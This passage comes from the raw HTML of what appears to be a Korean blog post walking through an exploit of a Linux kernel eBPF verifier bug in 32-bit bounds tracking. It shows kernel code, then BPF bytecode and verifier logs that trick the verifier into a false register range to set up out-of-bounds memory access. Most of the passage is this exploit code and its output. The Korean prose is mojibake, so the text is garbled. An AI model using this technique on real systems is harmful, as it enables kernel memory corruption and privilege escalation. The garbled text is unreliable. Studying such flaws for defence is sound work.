class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_off&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum_or&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hi32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tnum_intersect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lo32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;regâ†’umin_value &amp;amp; 0xffffffff&lt;/code&gt;ë¥¼ í•˜ê³  ìˆëŠ”ë° ì»´íŒŒì¼ ì‹œ ìµœì†Œê°’ì„ &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, ìµœëŒ€ê°’ì„ &lt;code class=&quot;highlighter-rouge&quot;&gt;2**32+1&lt;/code&gt;ë¡œ ì£¼ê²Œ ëœë‹¤ë©´ ë²”ìœ„ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;[1, 1]&lt;/code&gt;ì´ ëœë‹¤. ì´ë ‡ê²Œ ë§Œë“  ê°’ì„ &lt;code class=&quot;highlighter-rouge&quot;&gt;tnum_intersect&lt;/code&gt;ë¡œ ë‚´ë³´ë‚´ ìƒìœ„ ë¹„íŠ¸ì™€ orì—°ì‚°ì„ í•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;var_off&lt;/code&gt;ë¥¼ ì™„ì„±í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë¥¼ ì´ìš©í•˜ë ¤ë©´ ë ˆì§€ìŠ¤í„°ì˜ ì œì•½ì¡°ê±´ì„ ë§ì¶°ì£¼ë©´ ëœë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ì‹¤ì œ ê°’ì´ 2&lt;/li&gt;
  &lt;li&gt;range = [1, 2**32 + 1 == 1]&lt;/li&gt;
  &lt;li&gt;32ë¹„íŠ¸ ë¹„êµ ì—°ì‚°&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì—¬ê¸°ì„œ ì‹¤ì œ ê°’ì„ ì„¸íŒ…í•˜ë ¤ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;BPF_MOV64_REG(BPF_REG_0, 2)&lt;/code&gt; ì´ëŸ°ì‹ìœ¼ë¡œ ì„¸íŒ…í•˜ê²Œ ë˜ë©´ rangeëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;[2, 2]&lt;/code&gt;ê°€ ë˜ì–´ë²„ë¦°ë‹¤. ì´ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ mapì„ ë§Œë“¤ê³  ë©”ëª¨ë¦¬ë¥¼ ë°”ê¾¸ê³ , ë°”ë€ ë©”ëª¨ë¦¬ë¥¼ ë¶ˆëŸ¬ ê²€ì‚¬í•˜ëŠ” ê³¼ì •ìœ¼ë¡œ ì§„í–‰í•œë‹¤. oobë¥¼ ìœ„í•œ rangeê°€ ë³€ì¡° ëœ r6 ì¤€ë¹„&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// í• ë‹¹ëœ ë©”ëª¨ë¦¬ ì£¼ì†Œ&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff8880060cc000&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r10&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bpf_map_lookup_elem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// memory ë‚´ ê°’ì„ ë³€ì¡°&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// update_elem(0, 2); &amp;lt;= ì½ì„ ë©”ëª¨ë¦¬&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// update_elem(1, 0);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// memory ì½ê¸°&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;R0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ì½ì€ ê°’ ë¹„êµ (min)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ì½ì€ ê°’ ë¹„êµ (max) &lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000001&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r7&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
